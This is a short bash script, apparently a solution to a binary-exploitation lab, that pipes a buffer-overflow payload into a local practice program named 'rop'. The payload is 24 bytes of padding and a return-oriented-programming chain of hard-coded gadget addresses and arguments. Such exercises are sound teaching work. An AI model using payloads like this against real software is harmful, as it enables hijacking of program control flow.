#!/bin/bash

python3 -c 'import sys; sys.stdout.buffer.write(b"A"*24 + b"\x6f\x13\x40\x00\x00\x00\x00\x00"
                                                        + b"\x09\x00\x00\x00\x00\x00\x00\x00"
                                                        + b"\x00\x00\x00\x00\x00\x00\x00\x00"
                                                        + b"\x71\x13\x40\x00\x00\x00\x00\x00"
                                                        + b"\x06\x00\x00\x00\x00\x00\x00\x00"
                                                        + b"\xc6\x12\x40\x00\x00\x00\x00\x00")' | ../support/rop
